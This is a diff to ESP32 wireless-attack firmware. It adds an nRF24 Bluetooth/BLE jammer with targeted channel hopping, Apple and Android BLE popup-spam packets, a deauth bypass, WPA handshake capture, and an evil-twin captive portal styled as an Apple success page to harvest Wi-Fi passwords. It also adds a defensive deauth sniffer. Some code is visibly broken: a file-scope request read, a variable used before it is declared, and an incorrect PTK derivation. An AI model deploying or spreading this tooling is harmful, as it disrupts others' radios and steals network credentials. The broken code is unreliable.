@@ -26,6 +26,34 @@
 #include "esp_gatts_api.h"
 #include "esp_bt_main.h"
 
+portMUX_TYPE counterMux = portMUX_INITIALIZER_UNLOCKED;
+
+// Performance optimization flags
+bool nrfTurboMode = false;  // When true, UI freezes for max speed
+unsigned long nrfLastStats = 0;
+
+// SPI speed constant (ADD THIS)
+#define NRF_SPI_SPEED 16000000
+
+// Thread-safe increment macros
+#define SAFE_INCREMENT(counter) do { \
+  portENTER_CRITICAL(&counterMux); \
+  counter++; \
+  portEXIT_CRITICAL(&counterMux); \
+} while(0)
+
+#define SAFE_ADD(counter, value) do { \
+  portENTER_CRITICAL(&counterMux); \
+  counter += value; \
+  portEXIT_CRITICAL(&counterMux); \
+} while(0)
+
+#define SAFE_READ(counter, dest) do { \
+  portENTER_CRITICAL(&counterMux); \
+  dest = counter; \
+  portEXIT_CRITICAL(&counterMux); \
+} while(0)
+
 // ==================== MARAUDER DEAUTH BYPASS ====================
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   if (arg == 31337)
@@ -54,17 +82,29 @@ DNSServer dnsServer;
 WebServer webServer(80);
 
 // ==================== nRF24L01 DUAL MODULE SETUP ====================
-#define NRF1_CE_PIN  25
-#define NRF1_CSN_PIN 26
-#define NRF2_CE_PIN  27
-#define NRF2_CSN_PIN 33
-#define HSPI_MISO 12
-#define HSPI_MOSI 13
-#define HSPI_SCLK 14
+#define NRF1_CE_PIN  26   // Changed from 4
+#define NRF1_CSN_PIN 25   // Changed from 15
+#define NRF2_CE_PIN  33   // Changed from 2
+#define NRF2_CSN_PIN 27   // Kept same (OK)
+#define HSPI_MISO 12      // Kept same
+#define HSPI_MOSI 13      // Kept same
+#define HSPI_SCLK 14      // Kept same
+
+const uint8_t ble_channels[] = {37, 38, 39};
+uint8_t current_ble_channel = 0;
+
+// Enhanced jammer stats
+uint32_t bleDisconnectsSent = 0;
+uint32_t bleConnectFloodSent = 0;
+
+// Pre-built packets for speed
+uint8_t adv_spam_packet[31];
+uint8_t disconnect_packet[31];
+uint8_t connect_flood_packet[31];
 
 SPIClass hspi(HSPI);
-RF24 radio1(NRF1_CE_PIN, NRF1_CSN_PIN);
-RF24 radio2(NRF2_CE_PIN, NRF2_CSN_PIN);
+RF24 radio1(NRF1_CE_PIN, NRF1_CSN_PIN, NRF_SPI_SPEED); 
+RF24 radio2(NRF2_CE_PIN, NRF2_CSN_PIN, NRF_SPI_SPEED);
 
 bool nrf1Available = false;
 bool nrf2Available = false;
@@ -145,8 +185,34 @@ bool dualNRFMode = true;
 uint32_t nrfJamPackets = 0;
 uint32_t nrf1Packets = 0;
 uint32_t nrf2Packets = 0;
-uint8_t nrfChannel = 2;
 unsigned long lastNRFJamTime = 0;
+
+// Smoochiee's hopping pattern variables
+unsigned int flag_radio1 = 0;   // Direction flag for radio 1
+unsigned int flag_radio2 = 0;   // Direction flag for radio 2
+int nrf_ch1 = 2;    // Radio 1 current channel (start low)
+int nrf_ch2 = 45;   // Radio 2 current channel (start mid, offset pattern)
+
+// Jamming mode
+enum NRFJamMode {
+  NRF_SWEEP,      // Smoochiee's sweep pattern (most effective)
+  NRF_RANDOM,     // Random hopping (chaotic)
+  NRF_FOCUSED     // Focused on critical BT/BLE channels
+};
+
+NRFJamMode nrfJamMode = NRF_SWEEP;  // Default to Smoochiee's method
+
+// Critical BT/BLE channels - focus here for max effect
+byte hopping_channel[] = { 
+  2, 26, 80,              // BLE advertising (most critical!)
+  0, 1, 4, 6, 8,          // BLE data low
+  22, 24, 28, 30,         // BT Classic hotspots
+  32, 34, 46, 48, 50, 52, // BT Classic more
+  74, 76, 78, 82, 84, 86  // BLE data high
+};
+
+byte ptr_hop1 = 0;  // Radio 1 pointer
+byte ptr_hop2 = 12; // Radio 2 pointer (offset by half array)
 
 // ==================== BEACON FLOOD VARIABLES ====================
 String customBeacons[20] = {};
@@ -201,6 +267,23 @@ struct SkimmerSignature {
 SkimmerSignature skimmers[10];
 int skimmerCount = 0;
 
+// ==================== DEAUTH SNIFFER ====================
+bool deauthSnifferActive = false;
+uint32_t detectedDeauths = 0;
+
+struct DeauthEvent {
+  uint8_t sourceMAC[6];
+  uint8_t targetMAC[6];
+  int8_t rssi;
+  unsigned long timestamp;
+  uint8_t channel;
+};
+
+DeauthEvent deauthEvents[50];
+int deauthEventCount = 0;
+int deauthScrollOffset = 0;
+#define MAX_DEAUTH_DISPLAY 8
+
 // ==================== MENU STATES ====================
 enum MenuState {
   BOOT_ANIMATION,
@@ -212,7 +295,7 @@ enum MenuState {
   BEACON_MANAGER,
   BEACON_ADD,
   CAPTURED_PASSWORDS,
-  HANDSHAKE_CAPTURE,          
+  HANDSHAKE_CAPTURE,
   BLE_MENU,
   BLE_SCAN_RESULTS,
   BLE_JAM_MENU,
@@ -227,6 +310,8 @@ enum MenuState {
   CAPTIVE_PORTAL_MENU,
   SNIFFER_MENU,
   SNIFFER_ACTIVE,
+  DEAUTH_SNIFFER,
+  DEAUTH_SNIFFER_ACTIVE,
   WARDRIVING_MODE,
   SPAM_MENU,
   MORE_TOOLS_MENU,
@@ -249,6 +334,89 @@ struct BLEResult {
 BLEResult bleDevices[50];
 int bleDeviceCount = 0;
 
+// Apple Company ID: 0x4C00 (Little Endian: 0x00, 0x4C)
+
+// Proximity Pairing - AirPods popup
+const uint8_t apple_proximity_pair[] = {
+  0x07,  // Type: Proximity Pairing
+  0x19,  // Length: 25 bytes
+  0x01,  // Status flags
+  0x02, 0x20,  // Device model (0x0220 = AirPods)
+  0x00,  // Status
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Device address (random)
+  0x00,  // Hint
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Reserved
+  0x00, 0x00, 0x00  // Battery levels
+};
+
+// Nearby Action - AppleTV/AirDrop popup
+const uint8_t apple_nearby_action[] = {
+  0x0F,  // Type: Nearby Action
+  0x05,  // Length: 5 bytes
+  0x00,  // Action flags
+  0xC0,  // Action type (AppleTV)
+  0x00, 0x00, 0x00  // Authentication tag
+};
+
+// AirTag found
+const uint8_t apple_airtag_popup[] = {
+  0x07,  // Type: Proximity Pairing
+  0x19,  // Length
+  0x01,
+  0x01, 0x42,  // Model: AirTag
+  0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00
+};
+
+// Apple device models for Proximity Pairing (0x07)
+const uint16_t apple_models[] = {
+  0x0220,  // AirPods
+  0x0F20,  // AirPods Pro
+  0x1320,  // AirPods Max
+  0x1420,  // AirPods Gen 3
+  0x0142,  // AirTag
+  0x0055,  // Airtag
+  0x0030,  // Hermes AirTag
+  0x0620,  // Beats Solo 3
+  0x0320,  // Powerbeats 3
+  0x0520   // BeatsX
+};
+
+// Nearby Action types (0x0F)
+const uint8_t apple_actions[] = {
+  0xC0,  // AppleTV Setup
+  0xC1,  // Mobile Backup
+  0xC3,  // AppleTV Pair
+  0xC5,  // AppleTV New User
+  0xC6,  // AppleTV AppleID Setup
+  0xC8,  // AppleTV Wireless Audio Sync
+  0xC9,  // AppleTV HomeKit Setup
+  0xCB,  // AppleTV Keyboard
+  0xD0   // Join this AppleTV?
+};
+
+// ==================== ANDROID FAST PAIR PACKET STRUCTURES ====================
+
+// Google Fast Pair - Model IDs that trigger "Connect your device" popup
+const uint32_t android_models[] = {
+  0x2D7A23,  // Pixel Buds
+  0x0001F0,  // Pixel Buds A-Series
+  0x718FA4,  // Galaxy Buds
+  0x92BBBD,  // Galaxy Buds+ 
+  0x9C64F4,  // Galaxy Buds Live
+  0xB49271,  // Galaxy Buds Pro
+  0x2D5F14,  // JBL Live Pro+
+  0x0E30C3,  // Sony WF-1000XM3
+  0xCD8256,  // Bose QC Earbuds
+  0x454E53,  // Nothing Ear (1)
+  0x0003F0,  // Pixel Buds Pro
+  0x003001,  // OnePlus Buds Pro
+  0xD320D9   // Xiaomi Buds 4
+};
+
 // ==================== ATTACK VARIABLES ====================
 bool deauthActive = false;
 bool useAlternativeDeauth = false;
@@ -256,6 +424,10 @@ uint8_t currentDeauthMethod = 0;  // 0=Standard, 1=Storm
 bool beaconFloodActive = false;
 bool appleSpamActive = false;
 bool androidSpamActive = false;
+unsigned long lastAppleSpam = 0;
+unsigned long lastAndroidSpam = 0;
+uint32_t appleSpamCount = 0;
+uint32_t androidSpamCount = 0;
 unsigned long lastAttackTime = 0;
 uint32_t deauthPacketsSent = 0;
 
@@ -388,46 +560,54 @@ void IRAM_ATTR wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) 
   packetCount++;
   uint8_t frameType = pkt->payload[0];
   
-  // Detect EAPOL frames (WPA handshake)
-  if (type == WIFI_PKT_MISC && pkt->rx_ctrl.sig_len > 100) {
-    // Check for EAPOL protocol (0x888E)
-    if (pkt->payload[30] == 0x88 && pkt->payload[31] == 0x8E) {
+  // CRITICAL: Only essential processing in interrupt context
+  // No Serial.println() - causes crashes!
+  
+  // === DEAUTH DETECTION (NEW) ===
+  if (deauthSnifferActive && (frameType == 0xC0 || frameType == 0xA0)) {
+    // Deauth or Disassociation frame detected
+    if (deauthEventCount < 50) {
+      DeauthEvent* event = &deauthEvents[deauthEventCount];
       
-      // Message 2 or 3 of 4-way handshake (contains MIC)
+      // Extract source MAC (sender of deauth)
+      memcpy(event->sourceMAC, &pkt->payload[10], 6);
+      
+      // Extract target MAC (receiver)
+      memcpy(event->targetMAC, &pkt->payload[4], 6);
+      
+      event->rssi = pkt->rx_ctrl.rssi;
+      event->channel = pkt->rx_ctrl.channel;
+      event->timestamp = millis();
+      
+      deauthEventCount++;
+      detectedDeauths++;
+    }
+  }
+  
+  // Detect EAPOL frames (WPA handshake) - FAST check only
+  if (type == WIFI_PKT_MISC && pkt->rx_ctrl.sig_len > 100) {
+    if (pkt->payload[30] == 0x88 && pkt->payload[31] == 0x8E) {
       uint8_t keyInfo = pkt->payload[37];
       
-      if ((keyInfo & 0x08) && (keyInfo & 0x01)) { // Has MIC + Pairwise
-        Serial.println("[+] WPA Handshake frame detected!");
-        
-        // Extract handshake data
+      if ((keyInfo & 0x08) && (keyInfo & 0x01)) {
+        // Extract only critical data
         memcpy(capturedHandshake.clientMAC, &pkt->payload[4], 6);
         memcpy(capturedHandshake.apMAC, &pkt->payload[10], 6);
         
-        // Extract ANonce (from AP in message 1/3)
-        if (!(keyInfo & 0x40)) { // Message 1 or 3
+        if (!(keyInfo & 0x40)) {
           memcpy(capturedHandshake.anonce, &pkt->payload[51], 32);
         }
         
-        // Extract SNonce (from client in message 2)
-        if (keyInfo & 0x40) { // Message 2 or 4
+        if (keyInfo & 0x40) {
           memcpy(capturedHandshake.snonce, &pkt->payload[51], 32);
           memcpy(capturedHandshake.mic, &pkt->payload[85], 16);
           capturedHandshake.captured = true;
-          
-          Serial.println("[+] FULL HANDSHAKE CAPTURED!");
-          addToConsole("Handshake captured!");
         }
       }
     }
   }
   
-  // Rest of existing sniffer code...
-  packetHistory[packetHistoryIndex].type = frameType;
-  packetHistory[packetHistoryIndex].rssi = pkt->rx_ctrl.rssi;
-  packetHistory[packetHistoryIndex].channel = pkt->rx_ctrl.channel;
-  packetHistory[packetHistoryIndex].timestamp = millis();
-  packetHistoryIndex = (packetHistoryIndex + 1) % MAX_SNIFFER_PACKETS;
-  
+  // Fast packet type counting
   if (frameType == 0x80) {
     beaconCount++;
   }
@@ -437,49 +617,62 @@ void IRAM_ATTR wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) 
   else if (frameType == 0xC0 || frameType == 0xA0) {
     deauthCount++;
   }
+  
+  // Store minimal packet info
+  packetHistory[packetHistoryIndex].type = frameType;
+  packetHistory[packetHistoryIndex].rssi = pkt->rx_ctrl.rssi;
+  packetHistory[packetHistoryIndex].channel = pkt->rx_ctrl.channel;
+  packetHistory[packetHistoryIndex].timestamp = millis();
+  packetHistoryIndex = (packetHistoryIndex + 1) % MAX_SNIFFER_PACKETS;
 }
 
+struct PasswordValidationTask {
+  String password;
+  String ssid;
+  bool* result;
+  bool* completed;
+};
 // ==================== VALIDATE PASSWORD AGAINST HANDSHAKE ====================
-bool validatePasswordWithHandshake(String password, String ssid) {
+void validatePasswordTask(void* parameter) {
+  PasswordValidationTask* params = (PasswordValidationTask*)parameter;
+  
+  Serial.println("[*] Validating password in background task...");
+  
   if (!capturedHandshake.captured) {
     Serial.println("[-] No handshake captured yet");
-    return false; // Can't validate without handshake
+    *(params->result) = false;
+    *(params->completed) = true;
+    vTaskDelete(NULL);
+    return;
   }
   
-  Serial.println("[*] Validating password against captured handshake...");
-  
-  // Step 1: Calculate PMK (Pairwise Master Key) using PBKDF2
+  // Step 1: Calculate PMK
   uint8_t pmk[32];
   
-  // PBKDF2-SHA1 with 4096 iterations (WPA2 standard)
-  // This is SLOW on ESP32 (~2-3 seconds per password)
   mbedtls_md_context_t ctx;
   mbedtls_md_init(&ctx);
   mbedtls_md_setup(&ctx, mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
   
+  // This is the slow part (2-3 seconds)
   mbedtls_pkcs5_pbkdf2_hmac(
     &ctx,
-    (const unsigned char*)password.c_str(), password.length(),
-    (const unsigned char*)ssid.c_str(), ssid.length(),
-    4096, // iterations
-    32,   // key length
+    (const unsigned char*)params->password.c_str(), params->password.length(),
+    (const unsigned char*)params->ssid.c_str(), params->ssid.length(),
+    4096,
+    32,
     pmk
   );
   
   mbedtls_md_free(&ctx);
   
-  // Step 2: Calculate PTK (Pairwise Transient Key)
+  // Step 2: Calculate PTK
   uint8_t ptk[64];
   uint8_t ptkData[100];
   int pos = 0;
   
-  // PTK = PRF(PMK, "Pairwise key expansion", 
-  //           Min(AA,SPA) || Max(AA,SPA) || Min(ANonce,SNonce) || Max(ANonce,SNonce))
-  
   memcpy(&ptkData[pos], "Pairwise key expansion", 23);
   pos += 23;
   
-  // Add MAC addresses (sorted)
   if (memcmp(capturedHandshake.apMAC, capturedHandshake.clientMAC, 6) < 0) {
     memcpy(&ptkData[pos], capturedHandshake.apMAC, 6); pos += 6;
     memcpy(&ptkData[pos], capturedHandshake.clientMAC, 6); pos += 6;
@@ -488,7 +681,6 @@ bool validatePasswordWithHandshake(String password, String ssid) {
     memcpy(&ptkData[pos], capturedHandshake.apMAC, 6); pos += 6;
   }
   
-  // Add nonces (sorted)
   if (memcmp(capturedHandshake.anonce, capturedHandshake.snonce, 32) < 0) {
     memcpy(&ptkData[pos], capturedHandshake.anonce, 32); pos += 32;
     memcpy(&ptkData[pos], capturedHandshake.snonce, 32); pos += 32;
@@ -497,8 +689,6 @@ bool validatePasswordWithHandshake(String password, String ssid) {
     memcpy(&ptkData[pos], capturedHandshake.anonce, 32); pos += 32;
   }
   
-  // Generate PTK using PRF
-  // Simplified - real implementation needs proper PRF function
   mbedtls_md_hmac(
     mbedtls_md_info_from_type(MBEDTLS_MD_SHA1),
     pmk, 32,
@@ -506,18 +696,67 @@ bool validatePasswordWithHandshake(String password, String ssid) {
     ptk
   );
   
-  // Step 3: Calculate MIC and compare
+  // Step 3: Compare MIC
   uint8_t calculatedMIC[16];
-  memcpy(calculatedMIC, ptk, 16); // KCK is first 16 bytes of PTK
+  memcpy(calculatedMIC, ptk, 16);
   
-  // Compare MIC
   bool matches = (memcmp(calculatedMIC, capturedHandshake.mic, 16) == 0);
   
   Serial.printf("[%s] Password validation: %s\n", 
                 matches ? "+" : "-", 
                 matches ? "CORRECT!" : "INCORRECT");
   
-  return matches;
+  *(params->result) = matches;
+  *(params->completed) = true;
+  
+  vTaskDelete(NULL);
+}
+
+bool validatePasswordWithHandshake(String password, String ssid) {
+  if (!capturedHandshake.captured) {
+    Serial.println("[-] No handshake captured yet");
+    return false;
+  }
+  
+  // ✅ Quick validation first
+  if (password.length() < 8 || password.length() > 63) {
+    return false;
+  }
+  
+  static bool validationResult = false;
+  static bool validationCompleted = false;
+  
+  PasswordValidationTask params;
+  params.password = password;
+  params.ssid = ssid;
+  params.result = &validationResult;
+  params.completed = &validationCompleted;
+  
+  validationCompleted = false;
+  
+  // Start validation task
+  xTaskCreate(
+    validatePasswordTask,
+    "pwd_validate",
+    8192,
+    &params,
+    1,
+    NULL
+  );
+  
+  // Wait for completion (with timeout)
+  unsigned long startTime = millis();
+  while (!validationCompleted && (millis() - startTime < 10000)) {
+    esp_task_wdt_reset();
+    delay(100);
+  }
+  
+  if (!validationCompleted) {
+    Serial.println("[!] Validation timeout");
+    return false;
+  }
+  
+  return validationResult;
 }
 
 bool validateWiFiPassword(String password) {
@@ -678,13 +917,21 @@ void displayCapturedPasswords() {
   tft.print("[ESC] Back");
 }
 
+String password = webServer.arg("password");
+
 // ==================== UPDATED handlePortalPost() WITH REAL VALIDATION ====================
 void handlePortalPost() {
   if (webServer.hasArg("password")) {
-    String password = webServer.arg("password");
-    
-    // Basic validation first (fast)
+    if (password.length() > 63) {
+      Serial.println("[!] Password too long, truncating");
+      password = password.substring(0, 63);
+    }
+    password.replace("\0", "");
     bool basicValid = validateWiFiPassword(password);
+    String password = webServer.arg("password");
+    if (password.length() > 63) {
+      password = password.substring(0, 63);
+    }
     
     // Real validation (slow, only if handshake captured)
     bool reallyCorrect = false;
@@ -745,23 +992,40 @@ void handlePortalPost() {
     html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
     html += "<meta http-equiv='refresh' content='3;url=/'>";
     html += "<style>";
-    html += "body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:20px;background:#f5f5f5;}";
-    html += ".container{max-width:400px;margin:50px auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}";
-    html += ".spinner{border:4px solid #f3f3f3;border-top:4px solid #007AFF;";
-    html += "border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;}";
+    html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
+    html += "background:#e5e5e5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}";
+    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);max-width:450px;width:100%;}";
+    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:30px;border-radius:12px 12px 0 0;";
+    html += "text-align:center;border-bottom:1px solid #b0b0b0;}";
+    html += ".success-icon{width:80px;height:80px;margin:0 auto 15px;background:#34C759;border-radius:50%;";
+    html += "display:flex;align-items:center;justify-content:center;box-shadow:0 2px 10px rgba(52,199,89,0.3);}";
+    html += ".success-icon::after{content:'✓';color:#fff;font-size:50px;font-weight:bold;}";
+    html += ".content{padding:30px;text-align:center;}";
+    html += "h2{margin:0 0 15px;color:#000;font-size:20px;font-weight:600;}";
+    html += "p{color:#505050;margin:10px 0;font-size:14px;line-height:1.5;}";
+    html += ".network-name{font-weight:600;color:#000;}";
+    html += ".spinner{border:3px solid #e0e0e0;border-top:3px solid #007AFF;border-radius:50%;";
+    html += "width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}";
     html += "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}";
-    html += "h2{color:#333;margin-bottom:10px;}";
-    html += "p{color:#666;line-height:1.6;}";
-    html += ".success{color:#28a745;font-size:48px;margin:10px;}";
+    html += ".footer{padding:15px;text-align:center;background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);";
+    html += "border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
+    html += ".redirect-text{font-size:12px;color:#86868b;margin:0;}";
     html += "</style></head>";
     html += "<body><div class='container'>";
-    html += "<div class='success'>✓</div>";
+    html += "<div class='header'>";
+    html += "<div class='success-icon'></div>";
     html += "<h2>Connection Successful!</h2>";
+    html += "</div>";
+    html += "<div class='content'>";
+    html += "<p>You are now connected to</p>";
+    html += "<p class='network-name'>\"" + selectedSSID + "\"</p>";
     html += "<div class='spinner'></div>";
-    html += "<p>You are now connected to <strong>" + selectedSSID + "</strong></p>";
-    html += "<p style='font-size:12px;color:#999;'>Redirecting...</p>";
+    html += "</div>";
+    html += "<div class='footer'>";
+    html += "<p class='redirect-text'>Redirecting to network settings...</p>";
+    html += "</div>";
     html += "</div></body></html>";
-    
+
     webServer.send(200, "text/html", html);
     
   } else {
@@ -769,20 +1033,37 @@ void handlePortalPost() {
     String html = "<!DOCTYPE html><html><head>";
     html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
     html += "<style>";
-    html += "body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:20px;background:#f5f5f5;}";
-    html += ".container{max-width:400px;margin:50px auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}";
-    html += ".error{color:#dc3545;font-size:48px;margin:10px;}";
-    html += "h2{color:#333;}";
-    html += "p{color:#666;}";
-    html += "a{color:#007AFF;text-decoration:none;font-weight:bold;}";
+    html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
+    html += "background:#e5e5e5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}";
+    html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);max-width:450px;width:100%;}";
+    html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:30px;border-radius:12px 12px 0 0;";
+    html += "text-align:center;border-bottom:1px solid #b0b0b0;}";
+    html += ".error-icon{width:80px;height:80px;margin:0 auto 15px;background:#FF3B30;border-radius:50%;";
+    html += "display:flex;align-items:center;justify-content:center;box-shadow:0 2px 10px rgba(255,59,48,0.3);}";
+    html += ".error-icon::after{content:'!';color:#fff;font-size:50px;font-weight:bold;}";
+    html += ".content{padding:30px;text-align:center;}";
+    html += "h2{margin:0 0 15px;color:#000;font-size:20px;font-weight:600;}";
+    html += "p{color:#505050;margin:10px 0;font-size:14px;line-height:1.5;}";
+    html += ".footer{padding:15px;text-align:center;background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);";
+    html += "border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
+    html += ".btn{display:inline-block;padding:8px 24px;background:#007AFF;color:#fff;text-decoration:none;";
+    html += "border-radius:6px;font-size:13px;font-weight:500;border:1px solid #007AFF;}";
+    html += ".btn:active{background:#0051D5;}";
     html += "</style></head>";
     html += "<body><div class='container'>";
-    html += "<div class='error'>✗</div>";
-    html += "<h2>Error</h2>";
-    html += "<p>Password is required.</p>";
-    html += "<p><a href='/'>Go Back</a></p>";
+    html += "<div class='header'>";
+    html += "<div class='error-icon'></div>";
+    html += "<h2>Connection Failed</h2>";
+    html += "</div>";
+    html += "<div class='content'>";
+    html += "<p>Password is required to connect to the network.</p>";
+    html += "<p style='font-size:13px;color:#86868b;'>Please enter a valid password and try again.</p>";
+    html += "</div>";
+    html += "<div class='footer'>";
+    html += "<a href='/' class='btn'>Go Back</a>";
+    html += "</div>";
     html += "</div></body></html>";
-    
+
     webServer.send(400, "text/html", html);
   }
 }
@@ -1297,89 +1578,408 @@ void detectSkimmer(String name, int rssi) {
   }
 }
 
+// ==================== DEAUTH SNIFFER FUNCTIONS ====================
+
+void startDeauthSniffer() {
+  deauthSnifferActive = true;
+  deauthEventCount = 0;
+  detectedDeauths = 0;
+  deauthScrollOffset = 0;
+  
+  WiFi.disconnect();
+  WiFi.mode(WIFI_STA);
+  delay(100);
+  
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
+  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
+  
+  currentState = DEAUTH_SNIFFER_ACTIVE;
+  addToConsole("Deauth sniffer started");
+  
+  Serial.println("[+] Deauth Sniffer Active");
+  Serial.printf("    Monitoring channel %d for deauth attacks\n", snifferChannel);
+  
+  displayDeauthSnifferActive();
+}
+
+void stopDeauthSniffer() {
+  deauthSnifferActive = false;
+  esp_wifi_set_promiscuous(false);
+  addToConsole("Deauth sniffer stopped");
+  
+  Serial.printf("[+] Deauth sniffer stopped - %d deauths detected\n", detectedDeauths);
+}
+
+void drawDeauthSnifferMenu() {
+  tft.fillScreen(COLOR_BG);
+  drawTerminalHeader("deauth sniffer");
+  
+  const char* menuItems[] = {
+    "Start Sniffer",
+    "Stop Sniffer",
+    "Change Channel"
+  };
+  
+  int y = HEADER_HEIGHT + 10;
+  for (int i = 0; i < 3; i++) {
+    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
+    y += MENU_ITEM_HEIGHT + MENU_SPACING;
+  }
+  
+  // Status
+  y += 20;
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.printf("Channel: ");
+  tft.setTextColor(COLOR_CYAN);
+  tft.printf("Ch %d", snifferChannel);
+  
+  y += 15;
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.printf("Status: ");
+  tft.setTextColor(deauthSnifferActive ? COLOR_ORANGE : COLOR_GREEN);
+  tft.printf(deauthSnifferActive ? "ACTIVE" : "STOPPED");
+  
+  y += 15;
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.printf("Detected: ");
+  tft.setTextColor(detectedDeauths > 0 ? COLOR_RED : COLOR_GREEN);
+  tft.printf("%d deauths", detectedDeauths);
+  
+  // Info
+  y += 30;
+  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+  y += 10;
+  
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("Detects deauth attacks from");
+  y += 12;
+  tft.setCursor(SIDE_MARGIN, y);
+  tft.println("other devices on the network");
+  
+  // Back button
+  int backY = 305;
+  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
+  tft.setTextColor(COLOR_RED);
+  tft.setCursor(85, backY + 3);
+  tft.print("[ESC] Back");
+}
+
+void displayDeauthSnifferActive() {
+  tft.fillScreen(COLOR_BG);
+  drawTerminalHeader("deauth sniffer");
+  
+  // Live indicator
+  static bool blink = false;
+  blink = !blink;
+  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
+  
+  int statsY = HEADER_HEIGHT + 5;
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_TEXT);
+  tft.setCursor(SIDE_MARGIN, statsY);
+  tft.printf("Ch:%d", snifferChannel);
+  
+  tft.setTextColor(detectedDeauths > 0 ? COLOR_RED : COLOR_GREEN);
+  tft.setCursor(80, statsY);
+  tft.printf("Deauths:%d", detectedDeauths);
+  
+  // Alert if deauths detected
+  if (detectedDeauths > 0) {
+    tft.setCursor(SIDE_MARGIN, statsY + 12);
+    tft.setTextColor(COLOR_RED);
+    tft.print("! ATTACK DETECTED !");
+  }
+  
+  int listY = HEADER_HEIGHT + 35;
+  tft.drawLine(0, listY - 2, SCREEN_WIDTH, listY - 2, COLOR_BORDER);
+  
+  // Column headers
+  tft.setTextSize(1);
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, listY);
+  tft.print("SOURCE");
+  tft.setCursor(120, listY);
+  tft.print("TARGET");
+  
+  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
+  listY += 15;
+  
+  int visibleEvents = MAX_DEAUTH_DISPLAY;
+  int totalEvents = deauthEventCount;
+  
+  if (totalEvents == 0) {
+    tft.setTextSize(1);
+    tft.setTextColor(COLOR_GREEN);
+    tft.setCursor(SIDE_MARGIN, listY + 40);
+    tft.print("No deauth attacks detected");
+    tft.setCursor(SIDE_MARGIN, listY + 55);
+    tft.setTextColor(COLOR_TEXT);
+    tft.print("Network is clean");
+  } else {
+    for (int i = 0; i < visibleEvents && (deauthScrollOffset + i) < totalEvents; i++) {
+      int idx = totalEvents - 1 - deauthScrollOffset - i;  // Newest first
+      
+      if (idx < 0 || idx >= totalEvents) continue;
+      
+      int y = listY + (i * 32);
+      
+      // Warning indicator
+      tft.setTextColor(COLOR_RED);
+      tft.setTextSize(1);
+      tft.setCursor(SIDE_MARGIN, y);
+      tft.print("[!]");
+      
+      // Source MAC
+      tft.setTextColor(COLOR_ORANGE);
+      tft.setCursor(SIDE_MARGIN + 20, y);
+      tft.printf("%02X:%02X:%02X", 
+                 deauthEvents[idx].sourceMAC[0],
+                 deauthEvents[idx].sourceMAC[1],
+                 deauthEvents[idx].sourceMAC[2]);
+      
+      // Arrow
+      tft.setTextColor(COLOR_DARK_GREEN);
+      tft.setCursor(SIDE_MARGIN + 72, y);
+      tft.print("->");
+      
+      // Target MAC
+      tft.setTextColor(COLOR_TEXT);
+      tft.setCursor(SIDE_MARGIN + 90, y);
+      tft.printf("%02X:%02X:%02X", 
+                 deauthEvents[idx].targetMAC[0],
+                 deauthEvents[idx].targetMAC[1],
+                 deauthEvents[idx].targetMAC[2]);
+      
+      // Details line
+      tft.setTextColor(COLOR_CYAN);
+      tft.setCursor(SIDE_MARGIN + 20, y + 10);
+      tft.printf("Ch%d", deauthEvents[idx].channel);
+      
+      tft.setTextColor(COLOR_YELLOW);
+      tft.setCursor(SIDE_MARGIN + 50, y + 10);
+      tft.printf("%ddBm", deauthEvents[idx].rssi);
+      
+      // Time ago
+      unsigned long ago = (millis() - deauthEvents[idx].timestamp) / 1000;
+      tft.setTextColor(COLOR_TEXT);
